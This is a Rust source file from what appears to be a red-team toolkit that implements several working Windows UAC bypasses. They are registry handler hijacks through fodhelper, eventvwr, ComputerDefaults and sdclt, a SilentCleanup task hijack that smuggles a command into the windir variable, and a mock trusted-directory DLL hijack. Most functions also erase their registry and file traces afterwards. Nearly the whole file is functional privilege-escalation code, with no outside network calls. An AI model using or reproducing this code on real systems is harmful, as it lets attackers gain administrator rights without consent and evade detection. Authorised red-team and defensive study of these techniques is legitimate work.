//! UAC Elevation and Bypass implementations

use crate::error::MemoricError;
use crate::safe_handle::SafeRegKey;
use serde_json::Value;

/// Wait for an elevated process to start (shared helper for all bypass methods).
/// Polls for the process by name for up to `timeout_ms` milliseconds.
fn wait_for_elevated_process(process_name: &str, timeout_ms: u32) -> Result<u32, MemoricError> {
    use windows::Win32::System::Diagnostics::ToolHelp::{
        CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W,
        TH32CS_SNAPPROCESS,
    };

    let start = std::time::Instant::now();
    let timeout = std::time::Duration::from_millis(timeout_ms as u64);

    loop {
        unsafe {
            if let Ok(snapshot) = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) {
                let mut entry = PROCESSENTRY32W {
                    dwSize: std::mem::size_of::<PROCESSENTRY32W>() as u32,
                    ..Default::default()
                };

                if Process32FirstW(snapshot, &mut entry).is_ok() {
                    loop {
                        let name = String::from_utf16_lossy(&entry.szExeFile)
                            .trim_end_matches('\0')
                            .to_lowercase();
                        if name == process_name.to_lowercase() {
                            let _ = windows::Win32::Foundation::CloseHandle(snapshot);
                            return Ok(entry.th32ProcessID);
                        }
                        if Process32NextW(snapshot, &mut entry).is_err() {
                            break;
                        }
                    }
                }
                let _ = windows::Win32::Foundation::CloseHandle(snapshot);
            }
        }

        if start.elapsed() >= timeout {
            return Err(MemoricError::WindowsApi(format!(
                "Timed out waiting for {} to start ({} ms)",
                process_name, timeout_ms
            )));
        }

        std::thread::sleep(std::time::Duration::from_millis(200));
    }
}

/// Delete a registry tree under HKCU using RegDeleteTreeW (handles subkeys).
fn delete_registry_tree(subkey: &str) -> Result<(), MemoricError> {
    use windows::Win32::System::Registry::{RegDeleteTreeW, HKEY_CURRENT_USER};

    let path: Vec<u16> = format!("{}\0", subkey).encode_utf16().collect();
    unsafe {
        RegDeleteTreeW(HKEY_CURRENT_USER, windows::core::PCWSTR(path.as_ptr()))
            .ok()
            .map_err(|e| {
                MemoricError::WindowsApi(format!("RegDeleteTreeW failed for {}: {}", subkey, e))
            })?;
    }
    Ok(())
}

/// Fodhelper UAC bypass
pub fn fodhelper_bypass(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::Foundation::CloseHandle;
    use windows::Win32::System::Registry::{
        RegCreateKeyExW, RegSetValueExW, HKEY_CURRENT_USER, KEY_WRITE, REG_OPEN_CREATE_OPTIONS,
    };
    use windows::Win32::System::Threading::{
        CreateProcessW, PROCESS_CREATION_FLAGS, PROCESS_INFORMATION, STARTUPINFOW,
    };

    let command = args
        .get("command")
        .and_then(|v| v.as_str())
        .unwrap_or("cmd.exe");
    tracing::warn!("[REDTEAM] Fodhelper bypass: {}", command);

    unsafe {
        // Step 1: Create registry key
        let mut hkey = Default::default();
        let path: Vec<u16> = "Software\\Classes\\ms-settings\\Shell\\Open\\command\0"
            .encode_utf16()
            .collect();

        RegCreateKeyExW(
            HKEY_CURRENT_USER,
            windows::core::PCWSTR(path.as_ptr()),
            0,
            None,
            REG_OPEN_CREATE_OPTIONS(0),
            KEY_WRITE,
            None,
            &mut hkey,
            None,
        )
        .ok()
        .map_err(|e| MemoricError::WindowsApi(format!("Failed to create registry key: {}", e)))?;

        let hkey = SafeRegKey::new(hkey);

        // Step 2: Set default value to command
        let cmd: Vec<u16> = format!("{}\0", command).encode_utf16().collect();
        RegSetValueExW(
            hkey.raw(),
            windows::core::PCWSTR([0].as_ptr()),
            0,
            windows::Win32::System::Registry::REG_SZ,
            Some(std::slice::from_raw_parts(
                cmd.as_ptr() as *const u8,
                cmd.len() * 2,
            )),
        )
        .ok()
        .map_err(|e| MemoricError::WindowsApi(format!("Failed to set command value: {}", e)))?;

        // Step 3: Set DelegateExecute to empty string
        let del: Vec<u16> = "DelegateExecute\0".encode_utf16().collect();
        RegSetValueExW(
            hkey.raw(),
            windows::core::PCWSTR(del.as_ptr()),
            0,
            windows::Win32::System::Registry::REG_SZ,
            Some(&[]),
        )
        .ok()
        .map_err(|e| MemoricError::WindowsApi(format!("Failed to set DelegateExecute: {}", e)))?;

        // Drop the key handle before launching (not strictly required, but clean)
        drop(hkey);

        // Step 4: Launch fodhelper.exe
        let mut si = STARTUPINFOW::default();
        si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
        let mut pi = PROCESS_INFORMATION::default();

        let fp: Vec<u16> = "C:\\Windows\\System32\\fodhelper.exe\0"
            .encode_utf16()
            .collect();
        CreateProcessW(
            None,
            windows::core::PWSTR(fp.as_ptr() as *mut _),
            None,
            None,
            false,
            PROCESS_CREATION_FLAGS(0),
            None,
            None,
            &mut si,
            &mut pi,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("Failed to launch fodhelper.exe: {}", e)))?;

        // Close process/thread handles from CreateProcessW
        let _ = CloseHandle(pi.hProcess);
        let _ = CloseHandle(pi.hThread);

        // Step 5: Wait for the elevated process to start (up to 5 seconds)
        let wait_result = wait_for_elevated_process("fodhelper.exe", 5000);

        // Step 6: Clean up registry (always, regardless of wait result)
        let cleanup_result = delete_registry_tree("Software\\Classes\\ms-settings");
        if let Err(ref e) = cleanup_result {
            tracing::warn!("Registry cleanup failed: {}", e);
        }

        // Return result
        match wait_result {
            Ok(_pid) => Ok(serde_json::json!({
                "success": true,
                "technique": "fodhelper",
                "command": command,
                "registry_cleaned": cleanup_result.is_ok()
            })),
            Err(e) => Err(MemoricError::PermissionDenied(format!(
                "Fodhelper bypass failed: {}",
                e
            ))),
        }
    }
}

/// Eventvwr UAC bypass
pub fn eventvwr_bypass(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::Foundation::CloseHandle;
    use windows::Win32::System::Registry::{
        RegCreateKeyExW, RegSetValueExW, HKEY_CURRENT_USER, KEY_WRITE, REG_OPEN_CREATE_OPTIONS,
    };
    use windows::Win32::System::Threading::{
        CreateProcessW, PROCESS_CREATION_FLAGS, PROCESS_INFORMATION, STARTUPINFOW,
    };

    let command = args
        .get("command")
        .and_then(|v| v.as_str())
        .unwrap_or("cmd.exe");
    tracing::warn!("[REDTEAM] Eventvwr bypass: {}", command);

    unsafe {
        // Step 1: Create registry key for mscfile handler
        let mut hkey = Default::default();
        let path: Vec<u16> = "Software\\Classes\\mscfile\\shell\\open\\command\0"
            .encode_utf16()
            .collect();

        RegCreateKeyExW(
            HKEY_CURRENT_USER,
            windows::core::PCWSTR(path.as_ptr()),
            0,
            None,
            REG_OPEN_CREATE_OPTIONS(0),
            KEY_WRITE,
            None,
            &mut hkey,
            None,
        )
        .ok()
        .map_err(|e| MemoricError::WindowsApi(format!("Failed to create registry key: {}", e)))?;

        let hkey = SafeRegKey::new(hkey);

        // Step 2: Set default value to command
        let cmd: Vec<u16> = format!("{}\0", command).encode_utf16().collect();
        RegSetValueExW(
            hkey.raw(),
            windows::core::PCWSTR([0].as_ptr()),
            0,
            windows::Win32::System::Registry::REG_SZ,
            Some(std::slice::from_raw_parts(
                cmd.as_ptr() as *const u8,
                cmd.len() * 2,
            )),
        )
        .ok()
        .map_err(|e| MemoricError::WindowsApi(format!("Failed to set command value: {}", e)))?;

        drop(hkey);

        // Step 3: Launch eventvwr.exe
        let mut si = STARTUPINFOW::default();
        si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
        let mut pi = PROCESS_INFORMATION::default();

        let ep: Vec<u16> = "C:\\Windows\\System32\\eventvwr.exe\0"
            .encode_utf16()
            .collect();
        CreateProcessW(
            None,
            windows::core::PWSTR(ep.as_ptr() as *mut _),
            None,
            None,
            false,
            PROCESS_CREATION_FLAGS(0),
            None,
            None,
            &mut si,
            &mut pi,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("Failed to launch eventvwr.exe: {}", e)))?;

        let _ = CloseHandle(pi.hProcess);
        let _ = CloseHandle(pi.hThread);

        // Step 4: Wait for the elevated process
        let wait_result = wait_for_elevated_process("eventvwr.exe", 5000);

        // Step 5: Clean up mscfile registry tree
        let cleanup_result = delete_registry_tree("Software\\Classes\\mscfile");
        if let Err(ref e) = cleanup_result {
            tracing::warn!("Registry cleanup failed: {}", e);
        }

        match wait_result {
            Ok(_pid) => Ok(serde_json::json!({
                "success": true,
                "technique": "eventvwr",
                "command": command,
                "registry_cleaned": cleanup_result.is_ok()
            })),
            Err(e) => Err(MemoricError::PermissionDenied(format!(
                "Eventvwr bypass failed: {}",
                e
            ))),
        }
    }
}

/// ComputerDefaults UAC bypass
pub fn computerdefaults_bypass(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::Foundation::CloseHandle;
    use windows::Win32::System::Registry::{
        RegCreateKeyExW, RegSetValueExW, HKEY_CURRENT_USER, KEY_WRITE, REG_OPEN_CREATE_OPTIONS,
    };
    use windows::Win32::System::Threading::{
        CreateProcessW, PROCESS_CREATION_FLAGS, PROCESS_INFORMATION, STARTUPINFOW,
    };

    let command = args
        .get("command")
        .and_then(|v| v.as_str())
        .unwrap_or("cmd.exe");
    tracing::warn!("[REDTEAM] ComputerDefaults bypass: {}", command);

    unsafe {
        // Step 1: Create registry key (same ms-settings as fodhelper)
        let mut hkey = Default::default();
        let path: Vec<u16> = "Software\\Classes\\ms-settings\\Shell\\Open\\command\0"
            .encode_utf16()
            .collect();

        RegCreateKeyExW(
            HKEY_CURRENT_USER,
            windows::core::PCWSTR(path.as_ptr()),
            0,
            None,
            REG_OPEN_CREATE_OPTIONS(0),
            KEY_WRITE,
            None,
            &mut hkey,
            None,
        )
        .ok()
        .map_err(|e| MemoricError::WindowsApi(format!("Failed to create registry key: {}", e)))?;

        let hkey = SafeRegKey::new(hkey);

        // Step 2: Set default value to command
        let cmd: Vec<u16> = format!("{}\0", command).encode_utf16().collect();
        RegSetValueExW(
            hkey.raw(),
            windows::core::PCWSTR([0].as_ptr()),
            0,
            windows::Win32::System::Registry::REG_SZ,
            Some(std::slice::from_raw_parts(
                cmd.as_ptr() as *const u8,
                cmd.len() * 2,
            )),
        )
        .ok()
        .map_err(|e| MemoricError::WindowsApi(format!("Failed to set command value: {}", e)))?;

        // Step 3: Set DelegateExecute to empty string
        let del: Vec<u16> = "DelegateExecute\0".encode_utf16().collect();
        RegSetValueExW(
            hkey.raw(),
            windows::core::PCWSTR(del.as_ptr()),
            0,
            windows::Win32::System::Registry::REG_SZ,
            Some(&[]),
        )
        .ok()
        .map_err(|e| MemoricError::WindowsApi(format!("Failed to set DelegateExecute: {}", e)))?;

        drop(hkey);

        // Step 4: Launch ComputerDefaults.exe
        let mut si = STARTUPINFOW::default();
        si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
        let mut pi = PROCESS_INFORMATION::default();

        let cd: Vec<u16> = "C:\\Windows\\System32\\ComputerDefaults.exe\0"
            .encode_utf16()
            .collect();
        CreateProcessW(
            None,
            windows::core::PWSTR(cd.as_ptr() as *mut _),
            None,
            None,
            false,
            PROCESS_CREATION_FLAGS(0),
            None,
            None,
            &mut si,
            &mut pi,
        )
        .map_err(|e| {
            MemoricError::WindowsApi(format!("Failed to launch ComputerDefaults.exe: {}", e))
        })?;

        let _ = CloseHandle(pi.hProcess);
        let _ = CloseHandle(pi.hThread);

        // Step 5: Wait for the elevated process
        let wait_result = wait_for_elevated_process("computerdefaults.exe", 5000);

        // Step 6: Clean up registry (was MISSING in original code)
        let cleanup_result = delete_registry_tree("Software\\Classes\\ms-settings");
        if let Err(ref e) = cleanup_result {
            tracing::warn!("Registry cleanup failed: {}", e);
        }

        match wait_result {
            Ok(_pid) => Ok(serde_json::json!({
                "success": true,
                "technique": "computerdefaults",
                "command": command,
                "registry_cleaned": cleanup_result.is_ok()
            })),
            Err(e) => Err(MemoricError::PermissionDenied(format!(
                "ComputerDefaults bypass failed: {}",
                e
            ))),
        }
    }
}

/// Request UAC elevation
pub fn request_elevation(_args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::Foundation::HWND;
    use windows::Win32::System::LibraryLoader::GetModuleFileNameW;
    use windows::Win32::System::LibraryLoader::GetModuleHandleW;
    use windows::Win32::UI::Shell::{ShellExecuteExW, SEE_MASK_NOCLOSEPROCESS, SHELLEXECUTEINFOW};

    tracing::info!("[REDTEAM] Requesting UAC elevation");

    unsafe {
        let mut path_buf = [0u16; 512];
        let hinst = GetModuleHandleW(None).unwrap_or_default();
        let len = GetModuleFileNameW(hinst, &mut path_buf);
        if len == 0 {
            return Err(MemoricError::WindowsApi(
                "Failed to get module path".to_string(),
            ));
        }

        let verb: Vec<u16> = "runas\0".encode_utf16().collect();

        let mut sei = SHELLEXECUTEINFOW {
            cbSize: std::mem::size_of::<SHELLEXECUTEINFOW>() as u32,
            fMask: SEE_MASK_NOCLOSEPROCESS,
            hwnd: HWND::default(),
            lpVerb: windows::core::PCWSTR(verb.as_ptr()),
            lpFile: windows::core::PCWSTR(path_buf.as_ptr()),
            lpParameters: windows::core::PCWSTR([0].as_ptr()),
            lpDirectory: windows::core::PCWSTR([0].as_ptr()),
            nShow: 1,
            ..Default::default()
        };

        ShellExecuteExW(&mut sei)
            .map_err(|e| MemoricError::PermissionDenied(format!("UAC elevation failed: {}", e)))?;

        Ok(serde_json::json!({"success": true, "message": "UAC prompt displayed"}))
    }
}

/// Check if running as admin
pub fn is_admin() -> Result<Value, MemoricError> {
    use windows::Win32::Security::TOKEN_ACCESS_MASK;
    use windows::Win32::Security::{GetTokenInformation, TokenElevation, TOKEN_ELEVATION};
    use windows::Win32::System::Threading::{GetCurrentProcess, OpenProcessToken};

    unsafe {
        let mut token_handle = Default::default();
        OpenProcessToken(
            GetCurrentProcess(),
            TOKEN_ACCESS_MASK(0x0008),
            &mut token_handle,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("Failed to open token: {}", e)))?;

        let mut elevation = TOKEN_ELEVATION::default();
        let mut size = 0u32;

        if GetTokenInformation(
            token_handle,
            TokenElevation,
            Some(&mut elevation as *mut _ as *mut _),
            std::mem::size_of::<TOKEN_ELEVATION>() as u32,
            &mut size,
        )
        .is_ok()
        {
            Ok(serde_json::json!({"is_admin": elevation.TokenIsElevated != 0}))
        } else {
            Ok(serde_json::json!({"is_admin": false, "error": "Failed to get token info"}))
        }
    }
}

/// Get System Privileges
pub fn get_system_privileges(_args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::Security::LookupPrivilegeNameW;
    use windows::Win32::Security::TOKEN_ACCESS_MASK;
    use windows::Win32::Security::{
        GetTokenInformation, TokenPrivileges, SE_PRIVILEGE_ENABLED, TOKEN_PRIVILEGES,
    };
    use windows::Win32::System::Threading::{GetCurrentProcess, OpenProcessToken};

    unsafe {
        let mut token_handle = Default::default();
        OpenProcessToken(
            GetCurrentProcess(),
            TOKEN_ACCESS_MASK(0x0008),
            &mut token_handle,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("Failed to open token: {}", e)))?;

        let mut size = 0u32;
        GetTokenInformation(token_handle, TokenPrivileges, None, 0, &mut size).ok();

        let mut buffer = vec![0u8; size as usize];
        if GetTokenInformation(
            token_handle,
            TokenPrivileges,
            Some(buffer.as_mut_ptr() as *mut _),
            size,
            &mut size,
        )
        .is_ok()
        {
            let tp = &*(buffer.as_ptr() as *const TOKEN_PRIVILEGES);
            let mut privileges = Vec::new();

            for i in 0..tp.PrivilegeCount {
                let la = tp.Privileges[i as usize];
                if (la.Attributes & SE_PRIVILEGE_ENABLED).0 != 0 {
                    let mut name = vec![0u16; 256];
                    let mut name_len = name.len() as u32;
                    if LookupPrivilegeNameW(
                        None,
                        &la.Luid,
                        windows::core::PWSTR(name.as_mut_ptr()),
                        &mut name_len,
                    )
                    .is_ok()
                    {
                        name.truncate(name_len as usize);
                        let name_str = String::from_utf16_lossy(&name);
                        privileges.push(name_str.trim_end_matches('\0').to_string());
                    }
                }
            }

            Ok(serde_json::json!({"privileges": privileges, "count": privileges.len()}))
        } else {
            Ok(serde_json::json!({"privileges": [], "error": "Failed to get privileges"}))
        }
    }
}

/// sdclt UAC bypass - hijacks exefile handler
pub fn sdclt_bypass(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::Foundation::CloseHandle;
    use windows::Win32::System::Registry::{
        RegCreateKeyExW, RegSetValueExW, HKEY_CURRENT_USER, KEY_WRITE, REG_OPEN_CREATE_OPTIONS,
    };
    use windows::Win32::System::Threading::{
        CreateProcessW, PROCESS_CREATION_FLAGS, PROCESS_INFORMATION, STARTUPINFOW,
    };

    let command = args
        .get("command")
        .and_then(|v| v.as_str())
        .unwrap_or("cmd.exe");
    tracing::warn!("[REDTEAM] sdclt bypass: {}", command);

    unsafe {
        let mut hkey = Default::default();
        let path: Vec<u16> = "Software\\Classes\\exefile\\shell\\runas\\command\0"
            .encode_utf16()
            .collect();

        RegCreateKeyExW(
            HKEY_CURRENT_USER,
            windows::core::PCWSTR(path.as_ptr()),
            0,
            None,
            REG_OPEN_CREATE_OPTIONS(0),
            KEY_WRITE,
            None,
            &mut hkey,
            None,
        )
        .ok()
        .map_err(|e| MemoricError::WindowsApi(format!("Failed to create registry key: {}", e)))?;

        let hkey = SafeRegKey::new(hkey);

        let cmd: Vec<u16> = format!("{}\0", command).encode_utf16().collect();
        RegSetValueExW(
            hkey.raw(),
            windows::core::PCWSTR([0].as_ptr()),
            0,
            windows::Win32::System::Registry::REG_SZ,
            Some(std::slice::from_raw_parts(
                cmd.as_ptr() as *const u8,
                cmd.len() * 2,
            )),
        )
        .ok()
        .map_err(|e| MemoricError::WindowsApi(format!("Failed to set command: {}", e)))?;

        // Set DelegateExecute to empty
        let del: Vec<u16> = "DelegateExecute\0".encode_utf16().collect();
        RegSetValueExW(
            hkey.raw(),
            windows::core::PCWSTR(del.as_ptr()),
            0,
            windows::Win32::System::Registry::REG_SZ,
            Some(&[]),
        )
        .ok()
        .map_err(|e| MemoricError::WindowsApi(format!("Failed to set DelegateExecute: {}", e)))?;

        drop(hkey);

        // Launch sdclt.exe
        let mut si = STARTUPINFOW::default();
        si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
        let mut pi = PROCESS_INFORMATION::default();
        let fp: Vec<u16> = "C:\\Windows\\System32\\sdclt.exe\0"
            .encode_utf16()
            .collect();

        CreateProcessW(
            None,
            windows::core::PWSTR(fp.as_ptr() as *mut _),
            None,
            None,
            false,
            PROCESS_CREATION_FLAGS(0),
            None,
            None,
            &mut si,
            &mut pi,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("Failed to launch sdclt.exe: {}", e)))?;

        let _ = CloseHandle(pi.hProcess);
        let _ = CloseHandle(pi.hThread);

        std::thread::sleep(std::time::Duration::from_secs(3));

        let cleanup = delete_registry_tree("Software\\Classes\\exefile\\shell\\runas");

        Ok(serde_json::json!({
            "success": true,
            "technique": "sdclt_bypass",
            "command": command,
            "registry_cleaned": cleanup.is_ok(),
            "message": "sdclt UAC bypass executed"
        }))
    }
}

/// Disk Cleanup UAC bypass via SilentCleanup scheduled task
pub fn disk_cleanup_bypass(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::System::Registry::{
        RegCreateKeyExW, RegDeleteValueW, RegSetValueExW, HKEY_CURRENT_USER, KEY_WRITE,
        REG_OPEN_CREATE_OPTIONS, REG_SZ,
    };

    let command = args
        .get("command")
        .and_then(|v| v.as_str())
        .unwrap_or("cmd.exe");
    tracing::warn!("[REDTEAM] Disk Cleanup bypass: {}", command);

    unsafe {
        // Set HKCU\Environment\windir to our payload
        let mut hkey = Default::default();
        let path: Vec<u16> = "Environment\0".encode_utf16().collect();

        RegCreateKeyExW(
            HKEY_CURRENT_USER,
            windows::core::PCWSTR(path.as_ptr()),
            0,
            None,
            REG_OPEN_CREATE_OPTIONS(0),
            KEY_WRITE,
            None,
            &mut hkey,
            None,
        )
        .ok()
        .map_err(|e| MemoricError::WindowsApi(format!("Failed to open Environment key: {}", e)))?;

        let hkey = SafeRegKey::new(hkey);

        // Set windir to "cmd.exe /c <command> &&" so it becomes:
        // "cmd.exe /c <command> &&\System32\cleanmgr.exe"
        let payload = format!("{} &&\0", command);
        let payload_w: Vec<u16> = payload.encode_utf16().collect();
        let windir_name: Vec<u16> = "windir\0".encode_utf16().collect();

        RegSetValueExW(
            hkey.raw(),
            windows::core::PCWSTR(windir_name.as_ptr()),
            0,
            REG_SZ,
            Some(std::slice::from_raw_parts(
                payload_w.as_ptr() as *const u8,
                payload_w.len() * 2,
            )),
        )
        .ok()
        .map_err(|e| MemoricError::WindowsApi(format!("Failed to set windir: {}", e)))?;

        drop(hkey);

        // Trigger SilentCleanup task
        let output = std::process::Command::new("schtasks")
            .args([
                "/run",
                "/tn",
                "\\Microsoft\\Windows\\DiskCleanup\\SilentCleanup",
            ])
            .output();

        std::thread::sleep(std::time::Duration::from_secs(2));

        // Restore: delete the windir override
        let mut hkey2 = Default::default();
        RegCreateKeyExW(
            HKEY_CURRENT_USER,
            windows::core::PCWSTR(path.as_ptr()),
            0,
            None,
            REG_OPEN_CREATE_OPTIONS(0),
            KEY_WRITE,
            None,
            &mut hkey2,
            None,
        )
        .ok()
        .ok();
        let hkey2 = SafeRegKey::new(hkey2);
        let _ = RegDeleteValueW(hkey2.raw(), windows::core::PCWSTR(windir_name.as_ptr()));

        let task_result = match output {
            Ok(o) => String::from_utf8_lossy(&o.stdout).to_string(),
            Err(e) => format!("schtasks failed: {}", e),
        };

        Ok(serde_json::json!({
            "success": true,
            "technique": "disk_cleanup_bypass",
            "command": command,
            "schtasks_output": task_result.trim(),
            "message": "Disk Cleanup UAC bypass executed, windir restored"
        }))
    }
}

/// Mock Trusted Directory UAC bypass
/// Creates "C:\Windows \System32\" (space after Windows) and copies auto-elevate binary
pub fn mock_trusted_dir_bypass(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::Storage::FileSystem::{
        CopyFileW, CreateDirectoryW, DeleteFileW, RemoveDirectoryW,
    };

    let command = args
        .get("command")
        .and_then(|v| v.as_str())
        .unwrap_or("cmd.exe");
    let source_binary = args
        .get("source_binary")
        .and_then(|v| v.as_str())
        .unwrap_or("C:\\Windows\\System32\\winSAT.exe");
    let dll_payload = args
        .get("dll_payload")
        .and_then(|v| v.as_str())
        .ok_or_else(|| MemoricError::WindowsApi("Missing dll_payload path".to_string()))?;

    tracing::warn!("[REDTEAM] Mock Trusted Dir bypass: {}", command);

    unsafe {
        // Step 1: Create mock directory "C:\Windows \System32\"
        let mock_win: Vec<u16> = "C:\\Windows \0".encode_utf16().collect();
        let mock_sys: Vec<u16> = "C:\\Windows \\System32\0".encode_utf16().collect();

        let _ = CreateDirectoryW(windows::core::PCWSTR(mock_win.as_ptr()), None);
        CreateDirectoryW(windows::core::PCWSTR(mock_sys.as_ptr()), None)
            .map_err(|e| MemoricError::WindowsApi(format!("Failed to create mock dir: {}", e)))?;

        // Step 2: Copy auto-elevate binary
        let src: Vec<u16> = format!("{}\0", source_binary).encode_utf16().collect();
        let binary_name = std::path::Path::new(source_binary)
            .file_name()
            .and_then(|n| n.to_str())
            .unwrap_or("winSAT.exe");
        let dst_binary = format!("C:\\Windows \\System32\\{}\0", binary_name);
        let dst: Vec<u16> = dst_binary.encode_utf16().collect();

        CopyFileW(
            windows::core::PCWSTR(src.as_ptr()),
            windows::core::PCWSTR(dst.as_ptr()),
            false,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("Failed to copy binary: {}", e)))?;

        // Step 3: Copy DLL payload alongside
        let dll_src: Vec<u16> = format!("{}\0", dll_payload).encode_utf16().collect();
        let dll_dst_path = format!("C:\\Windows \\System32\\WINMM.dll\0");
        let dll_dst: Vec<u16> = dll_dst_path.encode_utf16().collect();

        CopyFileW(
            windows::core::PCWSTR(dll_src.as_ptr()),
            windows::core::PCWSTR(dll_dst.as_ptr()),
            false,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("Failed to copy DLL payload: {}", e)))?;

        // Step 4: Execute from mock path
        let exec_path = format!("C:\\Windows \\System32\\{}", binary_name);
        let _ = std::process::Command::new(&exec_path).spawn();

        std::thread::sleep(std::time::Duration::from_secs(3));

        // Step 5: Cleanup
        let _ = DeleteFileW(windows::core::PCWSTR(dst.as_ptr()));
        let _ = DeleteFileW(windows::core::PCWSTR(dll_dst.as_ptr()));
        let _ = RemoveDirectoryW(windows::core::PCWSTR(mock_sys.as_ptr()));
        let _ = RemoveDirectoryW(windows::core::PCWSTR(mock_win.as_ptr()));

        Ok(serde_json::json!({
            "success": true,
            "technique": "mock_trusted_dir_bypass",
            "command": command,
            "mock_path": "C:\\Windows \\System32\\",
            "source_binary": source_binary,
            "dll_payload": dll_payload,
            "message": "Mock trusted directory bypass executed and cleaned up"
        }))
    }
}
